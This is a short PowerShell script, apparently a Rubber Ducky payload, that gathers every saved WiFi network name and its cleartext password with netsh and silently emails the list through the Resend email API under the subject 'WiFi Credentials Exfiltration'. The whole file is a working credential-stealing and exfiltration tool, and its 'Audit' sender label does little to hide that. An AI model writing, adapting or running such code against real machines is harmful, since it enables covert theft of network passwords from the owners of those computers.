# Windows powershell script to extract all saved WiFi SSIDs and passwords

# Set your Resend API key and recipient email in the rubber ducky entry point
# $apiKey = "re_<your_api_key>"
# $recipient = "<your_email>"

$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}

$wifiList = foreach ($ssid in $profiles) {
    $pwLine = netsh wlan show profile name="$ssid" key=clear | Select-String "Key Content"
    if ($pwLine) {
        $password = ($pwLine -split ":")[1].Trim()
    } else {
        $password = "N/A"
    }
    "$ssid - {$password}"
}

$wifiString = $wifiList -join "`n"

$body = @{
    from = "Audit <onboarding@resend.dev>"
    to = @($recipient)
    subject = "WiFi Credentials Exfiltration"
    html = "<pre>$wifiString</pre>"
} | ConvertTo-Json

try {
    $null = Invoke-RestMethod -Uri "https://api.resend.com/emails" `
        -Method Post `
        -Headers @{ "Authorization" = "Bearer $apiKey"; "Content-Type" = "application/json" } `
        -Body $body `
        -ErrorAction SilentlyContinue
} catch {}